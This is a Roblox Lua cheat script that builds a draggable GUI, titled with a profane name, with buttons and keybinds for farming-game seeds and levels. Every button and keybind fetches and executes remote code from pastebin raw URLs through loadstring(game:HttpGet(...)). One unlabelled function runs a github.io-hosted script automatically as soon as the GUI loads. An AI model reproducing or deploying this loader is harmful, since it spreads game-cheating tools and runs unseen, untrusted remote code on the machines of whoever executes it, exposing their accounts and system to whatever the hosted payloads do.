local CLETUSFUCKER = Instance.new("ScreenGui")
local frame = Instance.new("Frame")
local CLETUSFUCKER_2 = Instance.new("TextLabel")
local christmas = Instance.new("TextButton")
local level1 = Instance.new("TextButton")
local level2 = Instance.new("TextButton")
local melon = Instance.new("TextButton")
local pineapples = Instance.new("TextButton")
local pumpkin = Instance.new("TextButton")

CLETUSFUCKER.Name = "CLETUS FUCKER"
CLETUSFUCKER.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

frame.Name = "frame"
frame.Parent = CLETUSFUCKER
frame.Active = true
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame.BorderSizePixel = 0
frame.Position = UDim2.new(0.620283365, 0, 0.617895901, 0)
frame.Size = UDim2.new(0, 419, 0, 220)

CLETUSFUCKER_2.Name = "CLETUSFUCKER"
CLETUSFUCKER_2.Parent = frame
CLETUSFUCKER_2.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
CLETUSFUCKER_2.BorderSizePixel = 0
CLETUSFUCKER_2.Position = UDim2.new(0, 0, -0.0681817979, 0)
CLETUSFUCKER_2.Size = UDim2.new(0, 419, 0, 15)
CLETUSFUCKER_2.Font = Enum.Font.SourceSans
CLETUSFUCKER_2.Text = "CLETUS FUCKER"
CLETUSFUCKER_2.TextColor3 = Color3.fromRGB(0, 0, 0)
CLETUSFUCKER_2.TextSize = 14.000

christmas.Name = "christmas"
christmas.Parent = frame
christmas.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
christmas.Position = UDim2.new(0.355608582, 0, 0.654545426, 0)
christmas.Size = UDim2.new(0, 106, 0, 50)
christmas.Font = Enum.Font.SourceSans
christmas.Text = "christmas tree"
christmas.TextColor3 = Color3.fromRGB(0, 0, 0)
christmas.TextSize = 14.000

level1.Name = "level1"
level1.Parent = frame
level1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
level1.BorderColor3 = Color3.fromRGB(53, 6, 9)
level1.Position = UDim2.new(0.0598560795, 0, 0.654699981, 0)
level1.Size = UDim2.new(0, 95, 0, 50)
level1.Font = Enum.Font.SourceSans
level1.Text = "farming levels"
level1.TextColor3 = Color3.fromRGB(0, 0, 0)
level1.TextSize = 14.000

level2.Name = "level2"
level2.Parent = frame
level2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
level2.BorderColor3 = Color3.fromRGB(53, 6, 9)
level2.Position = UDim2.new(0.691431999, 0, 0.657363713, 0)
level2.Size = UDim2.new(0, 95, 0, 50)
level2.Modal = true
level2.Font = Enum.Font.SourceSans
level2.Text = "economy levels"
level2.TextColor3 = Color3.fromRGB(0, 0, 0)
level2.TextSize = 14.000

melon.Name = "melon"
melon.Parent = frame
melon.BackgroundColor3 = Color3.fromRGB(69, 255, 66)
melon.BorderColor3 = Color3.fromRGB(85, 170, 0)
melon.Position = UDim2.new(0.0603458919, 0, 0.130702898, 0)
melon.Size = UDim2.new(0, 163, 0, 50)
melon.Font = Enum.Font.SourceSans
melon.Text = "MELON SEEDS"
melon.TextColor3 = Color3.fromRGB(0, 0, 0)
melon.TextSize = 14.000

pineapples.Name = "pineapples"
pineapples.Parent = frame
pineapples.BackgroundColor3 = Color3.fromRGB(255, 244, 88)
pineapples.BorderColor3 = Color3.fromRGB(255, 255, 127)
pineapples.Position = UDim2.new(0.243436754, 0, 0.386363626, 0)
pineapples.Size = UDim2.new(0, 200, 0, 50)
pineapples.Font = Enum.Font.SourceSans
pineapples.Text = "PINEAPPLE SEEDS"
pineapples.TextColor3 = Color3.fromRGB(0, 0, 0)
pineapples.TextSize = 14.000

pumpkin.Name = "pumpkin"
pumpkin.Parent = frame
pumpkin.BackgroundColor3 = Color3.fromRGB(255, 163, 33)
pumpkin.BorderColor3 = Color3.fromRGB(255, 170, 0)
pumpkin.Position = UDim2.new(0.506166101, 0, 0.126678318, 0)
pumpkin.Size = UDim2.new(0, 173, 0, 50)
pumpkin.Font = Enum.Font.SourceSans
pumpkin.Text = "PUMPKIN SEEDS"
pumpkin.TextColor3 = Color3.fromRGB(0, 0, 0)
pumpkin.TextSize = 14.000

-- Scripts:

local function YBRDKZO_fake_script() -- frame.draggable 
	local script = Instance.new('LocalScript', frame)

	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
	
end
coroutine.wrap(YBRDKZO_fake_script)()
local function DLIF_fake_script() -- frame.keybind 
	local script = Instance.new('LocalScript', frame)

	local player = game.Players.LocalPlayer
	local mouse = player:GetMouse()
	
	-- Settings
	
	bind = "v" -- has to be lowercase
	bind2 = "r"
	
	-- Script
	
	mouse.KeyDown:connect(function(key)
		if key == bind then
			loadstring(game:HttpGet(('https://pastebin.com/raw/6Wrt1Fui'),true))() -- levels
			loadstring(game:HttpGet(('https://pastebin.com/raw/5PvN7ebG'),true))() -- levels 
			loadstring(game:HttpGet(('https://pastebin.com/raw/rFgJsRcu'),true))() -- christmas tree
		end
	end)
	
	mouse.KeyDown:connect(function(key2)
		if key2 == bind2 then
			loadstring(game:HttpGet(('https://pastebin.com/raw/qiRDYaHX'),true))() -- melon
			loadstring(game:HttpGet(('https://pastebin.com/raw/8b8Vjm4f'),true))() -- pumpkin
			loadstring(game:HttpGet(('https://pastebin.com/raw/vQf9084F'),true))() -- pineapple
		end
	end)
end
coroutine.wrap(DLIF_fake_script)()
local function YVSYQA_fake_script() -- frame.sdsdsdsds 
	local script = Instance.new('LocalScript', frame)

	loadstring(game:HttpGet(('https://realkosmoss.github.io/websot/scripts/cletus/slolsdfdsf.lua'),true))()
end
coroutine.wrap(YVSYQA_fake_script)()
local function EBLMB_fake_script() -- christmas.LocalScript 
	local script = Instance.new('LocalScript', christmas)

	script.Parent.Parent.christmas.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet(('https://pastebin.com/raw/rFgJsRcu'),true))()
	end)
end
coroutine.wrap(EBLMB_fake_script)()
local function IDIAQ_fake_script() -- level1.LocalScript 
	local script = Instance.new('LocalScript', level1)

	script.Parent.Parent.level1.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet(('https://pastebin.com/raw/6Wrt1Fui'),true))()
	end)
end
coroutine.wrap(IDIAQ_fake_script)()
local function JFXJ_fake_script() -- level2.LocalScript 
	local script = Instance.new('LocalScript', level2)

	script.Parent.Parent.level2.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet(('https://pastebin.com/raw/5PvN7ebG'),true))()
	end)
end
coroutine.wrap(JFXJ_fake_script)()
local function QDJROR_fake_script() -- melon.LocalScript 
	local script = Instance.new('LocalScript', melon)

	script.Parent.Parent.melon.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet(('https://pastebin.com/raw/qiRDYaHX'),true))()
	end)
end
coroutine.wrap(QDJROR_fake_script)()
local function BMYFTD_fake_script() -- pineapples.LocalScript 
	local script = Instance.new('LocalScript', pineapples)

	script.Parent.Parent.pineapples.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet(('https://pastebin.com/raw/vQf9084F'),true))()
	end)
end
coroutine.wrap(BMYFTD_fake_script)()
local function HIHZ_fake_script() -- pumpkin.LocalScript 
	local script = Instance.new('LocalScript', pumpkin)

	script.Parent.Parent.pumpkin.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet(('https://pastebin.com/raw/8b8Vjm4f'),true))()
	end)
end
coroutine.wrap(HIHZ_fake_script)()
